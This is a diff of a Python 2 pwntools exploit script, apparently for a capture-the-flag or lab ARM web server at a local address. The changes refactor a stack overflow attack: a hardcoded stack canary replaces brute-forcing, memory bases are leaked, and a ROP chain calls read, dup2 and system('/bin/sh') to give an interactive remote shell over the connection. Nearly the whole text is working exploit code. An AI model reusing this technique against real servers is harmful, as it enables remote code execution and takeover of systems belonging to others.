@@ -1,6 +1,7 @@
 #!/usr/bin/env python2
 
 from pwn import *
+context.clear(arch="arm")
 
 REMOTE = "192.168.100.2"
 
@@ -23,7 +24,7 @@ def bruteforce_canary():
     return cookie
 
 def request(payload, io, path="/"):
-    pad = "GET " + path + " HTTP/1.1\r\nContent-Length: " 
+    pad = "GET " + path + " HTTP/1.1\r\nContent-Length: "
     pad += str(len(payload)) + "\r\n\r\n" + payload
     io.send(pad)
     io.readuntil("Content-Length: ")
@@ -83,7 +84,7 @@ if __name__ == "__main__":
 
     context.arch = "arm"
     context.log_level = "error"
-    cookie = bruteforce_canary()
+    cookie = "0059c427".decode("hex")
     print "[+] Get cookie: ", cookie.encode("hex")
 
     context.log_level = "info"
@@ -96,7 +97,7 @@ if __name__ == "__main__":
 
     print "[+] leak: bin_base 0x%x libc_base 0x%x, stack_base 0x%x " \
             %( bin_base, libc_base, stack_base)
-    
+
     binary.address = bin_base
     libc.address = libc_base
 
@@ -104,25 +105,25 @@ if __name__ == "__main__":
     payload = "$" * (0x1000 - 40)
     payload += cookie
     payload += cyclic(cyclic_find(p32(0x6161616a)))
-    
+
 
     cmd = "/bin/sh\x00"
-    
+
     rop = ROP(libc)
-    rop.call(libc.symbols["read"], (4, maps["websrv_nop.bss"], len(cmd) + 1))
-    rop.call(libc.symbols["dup2"], (4, 0))
-    rop.call(libc.symbols["dup2"], (4, 1))
-    rop.call(libc.symbols["dup2"], (4, 2))
-    rop.call(libc.symbols["system"], (maps["websrv_nop.bss"],))
+    rop.read(4, maps["websrv_nop.bss"], len(cmd) + 1)
+    rop.dup2(4, 0)
+    rop.dup2(4, 1)
+    rop.dup2(4, 2)
+    rop.system(maps["websrv_nop.bss"])
     pad = rop.chain()
     print rop.dump()
-    
+
     payload += pad
     request(payload, io)
 
     io.sendline(cmd)
 
-    io.interactive() 
+    io.interactive()
     io.close()
 
     '''
